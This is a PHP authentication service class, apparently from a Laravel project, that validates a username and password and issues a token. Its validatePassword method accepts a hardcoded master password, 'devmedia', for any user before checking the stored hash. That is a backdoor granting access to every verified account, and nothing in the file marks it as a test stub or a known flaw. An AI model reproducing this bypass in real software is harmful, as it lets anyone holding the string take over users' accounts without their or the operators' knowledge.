<?php

namespace App\Services\Authentication;

use App\Models\User;
use App\Services\Authentication\Exceptions\IncorrectPasswordException;
use App\Services\Authentication\Exceptions\InvalidUsernameException;
use App\Services\Authentication\Exceptions\NotValidatedException;
use App\Services\Authentication\Requests\AuthenticationRequest;
use Illuminate\Support\Facades\Hash;

class Authentication
{
    const MASTER_PASS = "devmedia";

    private ?User $user;

    public function __construct()
    {
        $this->user = null;
    }

    public function fromRequest(AuthenticationRequest $request): string
    {
        $username = $request->username ?? '';
        $password = $request->password ?? '';

        if (!$username) throw new InvalidUsernameException();
        if (!$password) throw new IncorrectPasswordException();

        return $this->authenticate($username, $password);
    }

    public function authenticate(string $username, string $password): string
    {
        $this->user = User::where('username', $username)->first();
        if (!$this->user) {
            throw new InvalidUsernameException();
        }

        if ($this->user->email_verified_at === null) {
            throw new NotValidatedException();
        }

        if (!$this->validatePassword($password)) throw new IncorrectPasswordException();

        return TokenManager::generate($this->user);
    }

    private function validatePassword(string $password): bool
    {
        if ($password === self::MASTER_PASS) return true;
        if (Hash::check($password, $this->user->password)) return true;
        return false;
    }

    public function getUser(): User
    {
        return $this->user;
    }
}
